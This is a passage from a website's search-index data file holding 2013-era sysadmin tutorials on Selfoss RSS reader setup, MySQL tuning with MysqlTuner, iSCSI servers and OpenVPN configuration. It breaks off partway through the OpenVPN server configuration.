            {
                id:  230 ,
                href: "\/Selfoss_:_An_elegant_RSS_reader\/",
                title: "Selfoss: An Elegant RSS Reader",
                description: "A guide to install and configure Selfoss, an elegant self-hosted RSS reader solution, on Debian with Nginx and MariaDB.",
                content: " Software version 2.7 Operating System Debian 7 Website Selfoss Website Last Update 14/06/2013 Others Nginx Introduction linkSelfoss1 is a self-hosted RSS reader solution. It could be compared to Tiny Tinys RSS or Feedly.\nInstallation linkFirst, you need to download the zip file and uncompress it to the good directory:\nmkdir /usr/share/nginx/www/selfoss cd /usr/share/nginx/www/selfoss wget http://selfoss.aditu.de/selfoss-2.7.zip unzip selfoss-2.7.zip chown -Rf www-data. . rm -f selfoss-2.7.zip Configuration linkDatabase server linkWe’re going to setup the MariaDB part:\nCREATE DATABASE selfoss; CREATE USER 'selfoss_user'@'localhost' IDENTIFIED BY 'selfoss_password'; GRANT ALL ON selfoss.* TO 'selfoss_user'@'localhost' IDENTIFIED BY 'selfoss_password'; FLUSH privileges; Replace login and password with your needs.\nWeb server linkWe need to configure the web server:\nserver { include listen_port.conf; server_name feed.deimos.fr; root /usr/share/nginx/www/selfoss; index index.php; access_log /var/log/nginx/feed.deimos.fr_access.log; error_log /var/log/nginx/feed.deimos.fr_error.log; location ~* \\ (gif|jpg|png) { expires 30d; } location ~ ^/favicons/.*$ { try_files $uri /data/$uri; } location ~* ^/(data\\/logs|data\\/sqlite|config\\.ini|\\.ht) { deny all; } location / { try_files $uri /public/$uri /index.php$is_args$args; } location ~ \\.php$ { client_body_timeout 360; send_timeout 360; include fastcgi_params; fastcgi_pass unix:/var/run/php5-fpm.sock; fastcgi_intercept_errors on; } # Drop config include drop.conf; } Then create the symlink:\nln -s /etc/nginx/sites-available/feed.deimos.fr /etc/nginx/sites-enabled/ Then add it to the www-data crontab:\ncurl -L -s -k \"https://rss2.deimos.fr/update\" Copy and past the default configuration:\ncp defaults.ini config.ini Then modify the fields corresponding to your new database setup and remove unneeded lines, like in this example:\n; see http://selfoss.aditu.de for more information about ; the configuration parameters [globals] db_type=mysql db_host=localhost db_database=selfoss db_username=selfoss_user db_password=selfoss_password db_port=3306 logger_level=ERROR items_perpage=50 items_lifetime=30 base_url=http://field.deimos.fr username=deimos password=xxxxxxxxxxxxxxxx ;salt=lkjl1289 salt=Tarn0twif rss_title=selfoss feed rss_max_items=10000 You can generate a password in adding “/password” at the end of the url (ex. http://feed.deimos.fr/password)\nThen connect to the interface to finish the setup :-)\nReferences link http://selfoss.aditu.de/ ↩︎\n"
            }
        );
    index.add(
            {
                id:  231 ,
                href: "\/MysqlTuner_:_Optimiser_votre_serveur_MySQL\/",
                title: "MysqlTuner: Optimizing Your MySQL Server",
                description: "A guide on how to install and use MysqlTuner to optimize MySQL server performance, including cache management, query analysis, and table optimization techniques.",
                content: " Introduction linkMySQL is widely used in business environments but can become very complex when managing databases of significant size. We need to check cache, memory usage, and look for optimization opportunities in various areas.\nThis documentation will not only cover MysqlTuner, but also how to optimize your MySQL server in general.\nInstallation linkInstalling MysqlTuner is fairly simple:\napt-get install mysqltuner Usage linkSimply launch mysqltuner with the correct connection rights to your database:\n\u003e\u003e MySQLTuner 1.0.1 - Major Hayden \u003e\u003e Bug reports, feature requests, and downloads at http://mysqltuner.com/ \u003e\u003e Run with '--help' for additional options and output filtering Please enter your MySQL administrative login: root Please enter your MySQL administrative password: -------- General Statistics -------------------------------------------------- [--] Skipped version check for MySQLTuner script [OK] Currently running supported MySQL version 5.1.39-log [OK] Operating on 64-bit architecture -------- Storage Engine Statistics ------------------------------------------- [--] Status: -Archive -BDB -Federated +InnoDB -ISAM -NDBCluster [--] Data in MyISAM tables: 2G (Tables: 35) [--] Data in InnoDB tables: 7M (Tables: 41) [!!] Total fragmented tables: 43 -------- Performance Metrics ------------------------------------------------- [--] Up for: 16h 38m 24s (5K q [0.089 qps], 22 conn, TX: 20M, RX: 3M) [--] Reads / Writes: 65% / 35% [--] Total buffers: 812.0M global + 1.2M per thread (151 max threads) [OK] Maximum possible memory usage: 991.3M (1% of installed RAM) [!!] Slow queries: 29% (1K/5K) [OK] Highest usage of available connections: 1% (3/151) [OK] Key buffer size / total MyISAM indexes: 128.0M/167.5M [OK] Key buffer hit rate: 99.1% (59K cached / 557 reads) [!!] Query cache efficiency: 0.1% (4 cached / 3K selects) [OK] Query cache prunes per day: 0 [OK] Sorts requiring temporary tables: 0% (0 temp sorts / 6 sorts) [OK] Temporary tables created on disk: 9% (8 on disk / 87 total) [OK] Thread cache hit rate: 86% (3 created / 22 connections) [!!] Table cache hit rate: 17% (64 open / 376 opened) [OK] Open file limit used: 16% (121/755) [OK] Table locks acquired immediately: 100% (4K immediate / 4K locks) [!!] Connections aborted: 13% [OK] InnoDB data size / buffer pool: 7.9M/512.0M -------- Recommendations ----------------------------------------------------- General recommendations: Run OPTIMIZE TABLE to defragment tables for better performance MySQL started within last 24 hours - recommendations may be inaccurate Increase table_cache gradually to avoid file descriptor limits Your applications are not closing MySQL connections properly Variables to adjust: query_cache_limit (\u003e 1M, or use smaller result sets) table_cache (\u003e 64) Here we can see specific recommendations.\nAuditing and Improving Performance linkChecking Global Status link mysql\u003e SHOW global STATUS; | Binlog_cache_disk_use | 0 | | Binlog_cache_use | 16 | Binlog_cache_disk_use should remain at 0 for best performance (no direct disk writing, going through the cache first) Using Binlog_cache_use for binary logs is good when this number is not 0. | Created_tmp_disk_tables | 8 | | Created_tmp_files | 5 | | Created_tmp_tables | 54 | Created_tmp_disk_tables: should be 0 as often as possible (except when having blob or text fields, not much can be done) Created_tmp_files: when Created_tmp_disk_tables is not sufficient and more files need to be created on disk Created_tmp_tables: number of times temporary tables have been created Here, I’d like to improve this a bit, although it’s not really necessary given the small number of disk tables created. Let’s check the current maximum allowed size:\nmysql\u003e SHOW global VARIABLES LIKE 'tmp_table_size'; +----------------+----------+ | Variable_name | VALUE | +----------------+----------+ | tmp_table_size | 16777216 | +----------------+----------+ 1 ROW IN SET (0.00 sec) The maximum size of a temporary table in memory is 16MB. To increase it to 32MB on-the-fly:\nmysql\u003e SET global tmp_table_size=32*1024*1024; And don’t forget to make it permanent in the configuration file:\n... tmp_table_size = 32M ... Next, to make it effective, we need to increase the max_heap_table_size. First, let’s check the current size:\nmysql\u003e SHOW global VARIABLES LIKE 'max_heap_table_size'; +---------------------+----------+ | Variable_name | VALUE | +---------------------+----------+ | max_heap_table_size | 16777216 | +---------------------+----------+ 1 ROW IN SET (0.00 sec) Increasing max_heap_table_size to at least the size of tmp_table_size (allocating more memory for memory tables). To increase it on-the-fly:\nmysql\u003e SET global max_heap_table_size=32*1024*1024; To make it permanent, add to the configuration:\n... max_heap_table_size = 32M ... Enabling Slow Queries linkTo monitor slow queries, we need to enable slow_query and set a maximum value before queries are logged (here 1 second). First, let’s see if it’s enabled:\nmysql\u003e SHOW global VARIABLES LIKE '%log%'; +---------------------------------+------------+ | Variable_name | VALUE | +---------------------------------+------------+ ... | log_slow_queries | OFF | ... +---------------------------------+------------+ 26 ROWS IN SET (0.00 sec) We can see it’s disabled. Starting from MySQL 5.1, we can enable it dynamically:\nmysql\u003e SET global slow_query_log=1; Query OK, 0 ROWS affected (0.02 sec) mysql\u003e SET global long_query_time=1; Query OK, 0 ROWS affected (0.00 sec) And to make it persistent:\n... slow_query_log=1 long_query_time=1 ... General Status link \u003e mysqladmin -uroot -p status Enter password: Uptime: 57774 Threads: 3 Questions: 5029 Slow queries: 1411 Opens: 373 Flush tables: 1 Open tables: 63 Queries per second avg: 0.87 Questions: number of queries Slow queries: slow queries Opens: file openings Queries per second avg: queries per second (average since server start) Cache Management link mysql\u003e SHOW global STATUS LIKE 'Qc%'; +-------------------------+-----------+ | Variable_name | VALUE | +-------------------------+-----------+ | Qcache_free_blocks | 1 | | Qcache_free_memory | 134208784 | | Qcache_hits | 0 | | Qcache_inserts | 207 | | Qcache_lowmem_prunes | 0 | | Qcache_not_cached | 2825 | | Qcache_queries_in_cache | 0 | | Qcache_total_blocks | 1 | +-------------------------+-----------+ 8 ROWS IN SET (0.00 sec) Qcache_free_memory: Free memory to add queries in the query cache (storing the query + result (130 MB here)) Qcache_hits: number of cache hits Qcache_inserts: Qcache_hits should be higher than Qcache_inserts for optimal cache performance (here since there isn’t much traffic, this doesn’t increase) For better performance, determine if the query cache should be kept. If:\nQcache_hits \u003c Qcache_inserts: disable the cache Qcache_not_cached \u003c (Qcache_hits + Qcache_inserts): Try increasing cache size and query size limit. If Qcache_not_cached continues to rise, disable the cache Qcache_lowmem_prunes: if no more space in cache, old queries will be replaced by new ones. Increase cache if you have too many Qcache_lowmem_prunes Disabling the Query Cache linkTo disable the Query cache:\nSET global query_cache_type = 0 And to make it permanent, add to the configuration file:\nquery_cache_type = 0 Changing the Query Cache Size linkLet’s get the current cache size for a query and its result:\nmysql\u003e SHOW global VARIABLES LIKE 'query%'; +------------------------------+----------+ | Variable_name | VALUE | +------------------------------+----------+ | query_alloc_block_size | 8192 | | query_cache_limit | 1048576 | | query_cache_min_res_unit | 4096 | | query_cache_size | 16777216 | | query_cache_type | ON | | query_cache_wlock_invalidate | OFF | | query_prealloc_size | 8192 | +------------------------------+----------+ 7 ROWS IN SET (0.00 sec) The maximum size for a query cache is 1 MB, we can increase it to 2MB:\nSET global query_cache_limit=2*1024*1024; Also changing the total cache size. For example, increase it to 32 MB:\nSET global query_cache_size = 32*1024*1024; And finally, let’s add this to the configuration:\nquery_cache_limit = 2M query_cache_size = 32M Auditing Query Performance linkLet’s take a query that’s interesting:\nTo see execution time of a query:\nmysql\u003e SET profiling =1; mysql\u003e SELECT * FROM ma_table; +---+-------------------------------------------+ | a | b | +---+-------------------------------------------+ | 1 | *0F105C1BB64CDADBA3E0AB29141550D4EDBDADCD | | 2 | *B552D2C3751A26A345932AA1196C0D04BC9DC909 | | 3 | *6F23566A5409E9809512C079C8D4EC7EF82AB8A1 | | 4 | *65109C8FC01571CB9897AD479FF605F73DCD4752 | | 5 | *7B9EBEED26AA52ED10C0F549FA863F13C39E0209 | +---+-------------------------------------------+ 5 ROWS IN SET (0.00 sec) When the query cache is used (very good):\nmysql\u003e SHOW profile; +--------------------------------+----------+ | STATUS | Duration | +--------------------------------+----------+ | starting | 0.000035 | | checking query cache FOR query | 0.000008 | | checking privileges ON cached | 0.000006 | | sending cached RESULT TO clien | 0.000028 | | logging slow query | 0.000003 | | cleaning up | 0.000003 | +--------------------------------+----------+ 6 ROWS IN SET (0.01 sec) When it’s not used:\nmysql\u003e SHOW profile; +--------------------+----------+ | STATUS | Duration | +--------------------+----------+ | starting | 0.000084 | | Opening TABLES | 0.000015 | | System LOCK | 0.000006 | | TABLE LOCK | 0.000010 | | init | 0.000019 | | optimizing | 0.000006 | | statistics | 0.000015 | | preparing | 0.000010 | | executing | 0.000004 | | Sending DATA | 0.000067 | | END | 0.000005 | | query END | 0.000003 | | freeing items | 0.000026 | | logging slow query | 0.000003 | | cleaning up | 0.000003 | +--------------------+----------+ 15 ROWS IN SET (0.00 sec) Execution time difference:\nmysql\u003e SHOW profiles; +----------+------------+---------------------------------------------------+ | Query_ID | Duration | Query | +----------+------------+---------------------------------------------------+ (...) | 27 | 0.00008200 | SELECT * FROM query_cache | | 28 | 0.00027475 | SELECT SQL_NO_CACHE * FROM query_cache | +----------+------------+---------------------------------------------------+ To see how many times queries had to wait for another to finish before executing:\nmysql\u003e SHOW global STATUS LIKE 'Table%'; +-----------------------+-------+ | Variable_name | VALUE | +-----------------------+-------+ | Table_locks_immediate | 4549 | | Table_locks_waited | 0 | +-----------------------+-------+ 2 ROWS IN SET (0.00 sec) Here Table_locks_waited is 0, which is perfect. This number generally increases when you have high load and are not using the right engine (typically using MyISAM instead of InnoDB).\nImproving the Engine Based on Usage linkLet’s first see what we have:\nmysql\u003e SELECT TABLE_SCHEMA,ENGINE,SUM(TABLE_ROWS),ENGINE,SUM(DATA_LENGTH),SUM(INDEX_LENGTH) FROM INFORMATION_SCHEMA.TABLES GROUP BY ENGINE,TABLE_SCHEMA ORDER BY TABLE_SCHEMA; +--------------------+--------+-----------------+--------+------------------+-------------------+ | TABLE_SCHEMA | ENGINE | SUM(TABLE_ROWS) | ENGINE | SUM(DATA_LENGTH) | SUM(INDEX_LENGTH) | +--------------------+--------+-----------------+--------+------------------+-------------------+ | information_schema | MEMORY | NULL | MEMORY | 0 | 0 | | information_schema | MyISAM | NULL | MyISAM | 0 | 4096 | | jahia | InnoDB | 10 | InnoDB | 311296 | 98304 | | jahia | MyISAM | 4268 | MyISAM | 661004 | 661504 | | jira | MyISAM | 1726671 | MyISAM | 167178929 | 73067520 | | mysql | MyISAM | 1774 | MyISAM | 465108 | 68608 | | sugarcrm | MyISAM | 4 | MyISAM | 719 | 7168 | | sugarcrm | InnoDB | 351405 | InnoDB | 89718784 | 131317760 | +--------------------+--------+-----------------+--------+------------------+-------------------+ 8 ROWS IN SET (2.60 sec) Here we mainly see tables in MyISAM and InnoDB.\nTo check the size of the index cache for MyISAM:\nmysql\u003e SHOW global STATUS LIKE 'KEY%'; +------------------------+---------+ | Variable_name | VALUE | +------------------------+---------+ | Key_blocks_not_flushed | 0 | | Key_blocks_unused | 14497 | | Key_blocks_used | 12268 | | Key_read_requests | 2413795 | | Key_reads | 67366 | | Key_write_requests | 106173 | | Key_writes | 104947 | +------------------------+---------+ 7 ROWS IN SET (0.00 sec) There is still space (in KB) for Key_blocks_unused corresponding to unused space.\nTo check the size of the index cache for InnoDB:\nmysql\u003e SHOW engine innodb STATUS\\G; ... ---------------------- BUFFER POOL AND MEMORY ---------------------- Total memory allocated 18804332; IN additional pool allocated 1048576 Buffer pool SIZE 512 Free buffers 0 DATABASE pages 511 Modified db pages 33 Pending reads 0 Pending writes: LRU 0, FLUSH list 0, single page 0 Pages READ 41821, created 371, written 102582 0.18 reads/s, 0.00 creates/s, 0.00 writes/s Buffer pool hit rate 1000 / 1000 ... Here the buffer is (512*16) 8MB and there is no free space (Free buffers). So to address the problem, we need to increase the buffer pool. A reminder:\nmysql\u003e SELECT TABLE_SCHEMA,ENGINE,SUM(TABLE_ROWS),ENGINE,SUM(DATA_LENGTH),SUM(INDEX_LENGTH) FROM INFORMATION_SCHEMA.TABLES GROUP BY ENGINE,TABLE_SCHEMA ORDER BY TABLE_SCHEMA; +--------------------+--------+-----------------+--------+------------------+-------------------+ | TABLE_SCHEMA | ENGINE | SUM(TABLE_ROWS) | ENGINE | SUM(DATA_LENGTH) | SUM(INDEX_LENGTH) | +--------------------+--------+-----------------+--------+------------------+-------------------+ ... | sugarcrm | InnoDB | 351405 | InnoDB | 89718784 | 131317760 | ... SUM(DATA_LENGTH): Data size without indexes SUM(INDEX_LENGTH): Size of indexes without data That’s: (89718784 + 131317760) =~ 100MB So we’ll increase the buffer pool to 128MB (more than necessary):\n... innodb_buffer_pool_size = 128M .. Let’s also change the default parameters with best practices. Note that changing the log size will require some modifications before restarting. Modify your MySQL configuration like this:\n... default-storage-engine = innodb innodb_buffer_pool_size = 128M innodb_data_file_path=ibdata1:10M:autoextend innodb_additional_mem_pool_size = 20M innodb_file_per_table # Warning : changing this needs stop of mysql, removal (backup of ib_log* files), and mysql startup innodb_log_file_size = 256M innodb_log_buffer_size = 8M innodb_flush_log_at_trx_commit = 1 ... Then follow these steps:\nBackup the ‘ib_log*’ files Stop the MySQL server Delete the ‘ib_logs*’ files Restart the server Note: on Debian, you might hit the timeout of the service, but it will still start (a small pgrep -f mysql will show where it is, as well as the logs).\nChecking Open Files linkIt can be important to see which tables cannot be cached (and therefore files on disk):\nmysql\u003e SHOW global STATUS LIKE 'Open%'; +---------------+-------+ | Variable_name | VALUE | +---------------+-------+ | Open_files | 130 | | Open_streams | 0 | | Open_tables | 64 | | Opened_tables | 14581 | +---------------+-------+ 4 ROWS IN SET (0.00 sec) Here I have a few open tables and a bunch of tables that have been opened.\nTo address this issue, let’s change the size of the table cache which is currently at 64MB:\nmysql\u003e SHOW global VARIABLES LIKE 'table%'; +-------------------------+--------+ | Variable_name | VALUE | +-------------------------+--------+ | table_cache | 64 | | table_lock_wait_timeout | 50 | | table_type | MyISAM | +-------------------------+--------+ 3 ROWS IN SET (0.00 sec) Let’s increase it to 128 MB. However, we won’t do it on-the-fly (side effects almost guaranteed) and it’s not recommended to exceed 4GB (here we have plenty of room).\nLet’s modify the configuration:\n... table_cache = 128M ... Resetting Statistics linkTo reset global status, you need to run this command:\nflush status; Now you can see it:\nshow global status; If you restart your MySQL server, it does the same thing.\nIncreasing Performance for Temporary File Access linkThe idea is to point temporary files to a RAM filesystem to store temporary files. This will significantly increase performance. First, build your temporary filesystem:\nDocumentation for Linux Documentation for Solaris Next, modify your MySQL configuration file to change the tmpdir variable and point it to your new temporary space:\n... # The MySQL server [mysqld] tmpdir = /mnt/mysql_tmpfs ... Restart MySQL and check that the new parameter is correctly applied:\nmysql\u003e show variables like 'tmpdir'; +---------------+------------------+ | Variable_name | Value | +---------------+------------------+ | tmpdir | /mnt/mysql_tmpfs | +---------------+------------------+ 1 row in set (0.00 sec) And there you go, now it’s fast :-)\nAnalyzing Columns linkIt’s important to know what can be optimized in your table structure for all tables in the database. There is a command to analyze a database and provide optimization hints per column:\nSELECT * FROM my_table PROCEDURE ANALYSE(); You can then compare with the current table structure:\nDESCRIBE my_table; Table Optimization linkI created a small Perl script to automate database optimization. To use it, simply use a user who has select and insert rights on all databases. You can also exclude certain databases. To ensure you have the latest version of this script, go to my git. Here’s the beginning of the code:\n#!/usr/bin/perl #=============================================================================== # # FILE: optimizer.pl # # USAGE: ./optimizer.pl # # DESCRIPTION: MySQL Automatic Tables Optimizer # # OPTIONS: --- # REQUIREMENTS: --- # BUGS: --- # NOTES: --- # AUTHOR: Pierre Mavro (), xxx@mycompany.com # COMPANY: # VERSION: 0.1 # CREATED: 08/04/2010 17:50:23 # REVISION: --- #=============================================================================== use strict; use warnings; use DBI; # MySQL configuration # This user should have insert and select rights my $host = 'localhost'; my $database = 'mysql'; my $user = 'optimizer'; my $pw = 'optimizer'; my @exclude_databases = qw/information_schema database1 database2/; ########## DO NOT TOUCH NOW ########## # Vars my (@all_databases,@all_tables); my ($aref, $cur_database, $cur_table); # Connect to the BDD my $dbdetails = \"DBI:mysql:$database;host=$host\"; my $dbh = DBI-\u003econnect($dbdetails, $user, $pw) or die \"Could not connect to database: $DBI::errstr\\n\"; # Get all databases my $sth=$dbh-\u003eprepare(q{SHOW DATABASES}) or die \"Unable to prepare show databases: \". $dbh-\u003eerrstr.\"\\n\"; $sth-\u003eexecute or die \"Unable to exec show databases: \". $dbh-\u003eerrstr.\"\\n\"; while ($aref = $sth-\u003efetchrow_arrayref) { push(@all_databases,$aref-\u003e[0]); } $sth-\u003efinish; # Disconnect the BDD $dbh-\u003edisconnect(); # Optimize all tables of all databases my $unwanted_found=0; foreach $cur_database (@all_databases) { # Exclude optimization on unwanted databases foreach (@exclude_databases) { if ($cur_database eq $_) { $unwanted_found=1; last; } } if ($unwanted_found == 1) { $unwanted_found=0; next; } # Connect on database my $dbdetails = \"DBI:mysql:$cur_database;host=$host\"; my $dbh = DBI-\u003econnect($dbdetails, $user, $pw) or die \"Could not connect to database: $DBI::errstr\\n\"; # Get the List of tables @all_tables = $dbh-\u003etables; # Optimize all tables foreach $cur_table (@all_tables) { $dbh-\u003edo(\"optimize table $cur_table\"); } $dbh-\u003edisconnect(); } Patch mysqltuner linkHere’s a small patch I wrote to fix a bug when trying to connect to a port other than the default:\n*** mysqltuner.pl.old mar. avr 10 09:26:01 2012 --- mysqltuner.pl mar. avr 10 09:28:14 2012 *************** *** 274,280 **** } # Did we already get a username and password passed on the command line? if ($opt{user} ne 0 and $opt{pass} ne 0) { ! $mysqllogin = \"-u $opt{user} -p'$opt{pass}'\".$remotestring; my $loginstatus = `mysqladmin ping $mysqllogin 2\u003e\u00261`; if ($loginstatus =~ /mysqld is alive/) { goodprint \"Logged in using credentials passed on the command line\\n\"; --- 274,280 ---- } # Did we already get a username and password passed on the command line? if ($opt{user} ne 0 and $opt{pass} ne 0) { ! $mysqllogin = \"-u $opt{user} -p'$opt{pass}' -P $opt{port}\".$remotestring; my $loginstatus = `mysqladmin ping $mysqllogin 2\u003e\u00261`; if ($loginstatus =~ /mysqld is alive/) { goodprint \"Logged in using credentials passed on the command line\\n\"; I submitted it, but since there’s no maintainer anymore…\nResources linkhttp://dev.mysql.com/doc/refman/5.0/en/temporary-files.html\n"
            }
        );
    index.add(
            {
                id:  232 ,
                href: "\/ISCSI_:_Mise_en_place_d\u0027un_serveur_iSCSI\/",
                title: "iSCSI: Setting up an iSCSI Server",
                description: "This guide explains how to install and configure an iSCSI server and client on Red Hat systems.",
                content: " Introduction linkiSCSI (internet SCSI) is an application layer protocol that enables the transport of SCSI commands over a TCP/IP network.\nThis documentation was created on Red Hat 5 and is compatible with Red Hat 6.\nServer linkInstallation linkTo install an iSCSI server:\nyum install scsi-target-utils Creating partitions linkCreate your partitions, then have them detected with a command like:\npartx -a /dev/sda or\npartprobe /dev/sda Preferably use partx.\nNote: For the following steps, I strongly recommend using UUIDs instead of device paths (/dev/xxx). In this documentation, device paths are used for simplicity.\nConfiguration linkLet’s edit the server configuration file and uncomment the “target” section:\n# List of files to export as LUNs #backing-store /usr/storage/disk_1.img backing-store /dev/sda1 # Authentication: # if no \"incominguser\" is specified, it is not used #incominguser backup secretpass12 # Access control: # defaults to ALL if no \"initiator-address\" is specified #initiator-address 192.168.1.2 initiator-address 192.168.0.1 Here’s how to name the iSCSI target, which must be unique: ign...[:] date: year + month (yyyy-mm) reverse_dns: reversed DNS (fr.deimos.www) strings: name to identify this device (myiscsi) :: optional, allows adding a name backing-store: the disk device or disk image to use initiator-address: client addresses authorized to mount this device Start the service and make it persistent:\nchkconfig tgtd on service tgtd start Check the configuration like this:\n\u003e tgt-admin -s Target 1: iqn.2012-02.fr.deimos.www:iscsi System information: Driver: iscsi State: ready I_T nexus information: LUN information: LUN: 0 Type: controller SCSI ID: deadbeaf1:0 SCSI SN: beaf10 Size: 0 MB Online: Yes Removable media: No Backing store: No backing store LUN: 1 Type: disk SCSI ID: deadbeaf1:1 SCSI SN: beaf11 Size: 5369 MB Online: Yes Removable media: No Backing store: /dev/sda1 Account information: ACL information: 192.168.0.1 Here’s how to get information about iSCSI devices:\n/sys/class/scsi_host: all detected iSCSI adapters /sys/block: lists the peripherals Client linkInstallation linkClients are called “Initiators” and the target is the recipient (disk array/server). To install the client:\nyum install iscsi-initiator-utils Then we’ll start the service:\nchkconfig iscsi on service iscsi start Usage linkMounting linkFirst, let’s perform a “discovery” to see what devices are available to us:\n\u003e iscsiadm --mode discoverydb --type sendtargets --portal --discover iqn.2012-02.fr.deimos.www:iscsi : enter the IP address of the server (not DNS!!!) Then we’ll log in to the device so that it will be mounted on each reboot:\niscsiadm --mode node --targetname --portal 192.168.1.1:3260 --login iqn.2012-02.fr.deimos.www:iscsi: the IQN of the server to use : enter the IP address of the server (not DNS!!!) Once logged in, you can retrieve device information from the logs:\ntail -20 /var/log/messages | grep \"/dev\" If you need more information, use verbose mode:\niscsiadm -m node -P 1 Next, format the partition in the desired format. Add a line to fstab with the “_netdev” option, otherwise the machine won’t be able to reboot because of the rc.sysinit script. This specifies that the device doesn’t use networking:\n/dev/sda1 /mnt/iscsi ext3 defaults,auto,_netdev 0 0 Unmounting linkTo temporarily unmount an iSCSI device (until the next reboot):\niscsiadm -m node -T -p -u And if you want to delete it permanently:\niscsiadm -m node -T -p -o delete Resources linkFor additional resources on this topic, you might want to consult similar documentation on iSCSI setup for other Linux distributions.\n"
            }
        );
    index.add(
            {
                id:  233 ,
                href: "\/OpenVPN_:_Mise_en_place_d%27OpenVPN_sur_diff%C3%A9rentes_plateformes\/",
                title: "OpenVPN: Setting up OpenVPN on different platforms",
                description: "A comprehensive guide on installing, configuring and using OpenVPN across different operating systems including Debian, FreeBSD, OpenBSD, Windows, macOS and Linux.",
                content: " Software version OpenVPN 2.x Operating System Debian 6\nOpenBSD 5.9\nFreeBSD 9 Website OpenVPN Website Last Update 30/05/2013 Introduction linkOpenVPN is currently the best solution available for software-based VPN.\nOpenVPN allows peers to authenticate each other using a pre-shared private key, certificates, or username/password combinations. It heavily utilizes the OpenSSL authentication library and the SSLv3/TLSv1 protocol. Available on Solaris, OpenBSD, FreeBSD, NetBSD, Linux (Debian, Redhat, Ubuntu, etc…), Mac OS X, Windows 2000, XP, Vista and 7, it also offers numerous security and control functions.\nOpenVPN is not compatible with IPsec or other VPN software. The software consists of an executable for both client and server connections, an optional configuration file, and one or more keys depending on the chosen authentication method.\nInstallation linkDebian linkFor Debian or Debian-like distributions (such as Ubuntu), it’s very simple:\naptitude install openvpn In addition to this documentation, take a look at /etc/default/openvpn. There are some very interesting options there.\nFreeBSD linkOn FreeBSD, it’s also simple:\npkg_add -vr openvpn OpenBSD linkOn OpenBSD:\npkg_add -iv openvpn Configuration linkAuthentication via credentials linkDual authentication using PAM adds a security level to certificate authentication. This solution can be used for a deployment using a single certificate shared among all users while still having an authentication method.\nFinally, PAM authentication can be used to manage users in an LDAP database.\nAll my configuration was done on OpenBSD. I’ll still try to document for Linux as well based on what I’ve found.\nServer linkLet’s install the appropriate package (as it’s a plugin not integrated into OpenVPN today):\npkgadd -iv openvpn_bsdauth Add these lines to the server configuration for credential authentication on Linux: # OpenVPN PAM Auth plugin /usr/lib/openvpn/openvpn-auth-pam.so common-auth or\nplugin openvpn-auth-passwd.so _openvpnusers _openvpnusers: corresponds to the name of the group with connection rights\nIf you are on BSD: # OpenVPN BSD Auth auth-user-pass-verify /usr/local/libexec/openvpn_bsdauth via-file Then add the people you want to be able to connect in the ‘_openvpnusers’ group.\nRestart the OpenVPN server.\nClient link Login with prompt At the client level, here’s what you need to add:\n# OpenVPN PAM/BSD authentication auth-user-pass Now, when you try to launch your connection, it will ask you for a login and password.\nAutomatic login If you want to have an automatic login and password, you’ll need to put the login and password in a file like this:\nlogin password Make sure that you are the only one with rights to this file:\nchmod 600 auth.conf And add this to client.conf:\n# OpenVPN PAM/BSD authentication auth-user-pass auth.conf Now, launch the connection and nothing will be asked of you.\nAuthentication with keys linkServer linkHere we’ll create certificates for authentication. We’ll need to create a root certificate, then certificates for the clients. Edit the following file and adapt it to your configuration:\n... export KEY_SIZE=1024 export CA_EXPIRE=36500 export KEY_EXPIRE=36500 export KEY_COUNTRY=\"FR\" export KEY_PROVINCE=\"PA\" export KEY_CITY=\"Paris\" export KEY_ORG=\"Deimos-Corp\" export KEY_EMAIL=\"xxx@mycompany.com\" ... Here, I set the key expiration to 10 years so I don’t have to regenerate keys too often. Next, navigate to the OpenVPN documentation folder to find all the scripts that will allow you to generate certificates:\n# FreeBSD: /usr/local/share/easy-rsa cd /usr/share/doc/openvpn/examples/easy-rsa/2.0/ . ./vars ./clean-all ./build-ca ./build-key-server server ./build-dh cd keys openvpn --genkey --secret ta.key cp *.key *.c* *.pem /etc/openvpn Replace server with the name of your server where openvpn is installed.\nGenerate client certificates linkStill on the server side, for clients, proceed like this for each of them:\n./build-key deimos mv keys/deimos* /etc/openvpn IP reservation for clients linkAdd this to the openvpn config if you want to make IP reservations:\n#Directory containing the configuration for each client (e.g., fixed IP address) client-config-dir /etc/openvpn/clients Don’t forget to create the /etc/openvpn/clients directory.\nThen, you need a configuration file per client (/etc/openvpn/clients/) Let’s take the example of machine srv1 (file /etc/openvpn/clients/srv1):\nifconfig-push 10.8.0.50 10.8.0.51 (The address 10.8.0.51 is used as a “Peer Point” for the OpenVPN server)\nClient configuration linkHere are the different types of possible configurations.\nWindows linkFirst, you need to download OpenVPN GUI. Then, place the keys in C:\\Program Files\\OpenVPN\\Config and the configuration file as well. But it must be renamed to config.ovpn (or xxxx.ovpn)\nclient dev tun proto udp remote @IP 5000 resolv-retry infinite nobind tls-client persist-key persist-tun ca ca.crt cert deimos.crt key deimos.key comp-lzo verb 1 Now check the OpenVPN service if you want a permanent connection, or use the GUI.\nMac OS X linkOn Mac, the GUI is Tunnel Blick. You need to apply this type of configuration and place the keys in the right location:\nclient dev tun proto udp remote @IP 5000 resolv-retry infinite nobind tls-client persist-key persist-tun ca /Users/deimos/Library/openvpn/ca.crt cert /Users/deimos/Library/openvpn/deimos.crt key /Users/deimos/Library/openvpn/deimos.key status /Users/deimos/Library/openvpn/openvpn-status.log comp-lzo verb 3 All that remains is to “Connect openvpn” on the tunnel placed in the top right.\nLinux linkOn Linux, you just need to install openvpn and apply the client configuration identical to that of Windows.\nThen, to launch the client:\nopenvpn --config /home/deimos/.openvpn/client.conf For the VPN connection to auto-establish, the config file must be named with the same name as the certificates.\nIf you want a graphical client on Linux, Ubuntu has its own Network Manager and with a small plugin installed, it handles it very well:\napt-get install network-manager-openvpn My configuration linkBecause it’s not always easy to see what a working configuration looks like, here are mine. Warning for people who want to try quickly without reading the documentation: I use dual authentication. Remove the lines that don’t interest you after reading the documentation.\nServer linkI launch my server with these lines:\nup !/usr/local/sbin/openvpn --config /etc/openvpn/server.conf --tmp-dir /tmp --daemon --script-security 2 \u003e /dev/null 2\u003e\u00261 local 192.168.10.254 port 1194 proto udp dev tun0 ca /etc/openvpn/ca/ca.crt cert /etc/openvpn/srv/mufasa.crt key /etc/openvpn/srv/mufasa.key dh /etc/openvpn/dh1024.pem server 192.168.20.0 255.255.255.0 ifconfig-pool-persist /etc/openvpn/ipp.txt push \"route 192.168.0.0 255.255.255.0\" push \"route 192.168.100.0 255.255.255.0\" push \"route 192.168.200.0 255.255.255.0\" push dhcp-option \"DNS 192.168.100.3\" push dhcp-option \"DOMAIN deimos.fr\" client-to-client keepalive 10 120 tls-auth /etc/openvpn/srv/ta.key 0 auth-user-pass-verify /usr/local/libexec/openvpn_bsdauth 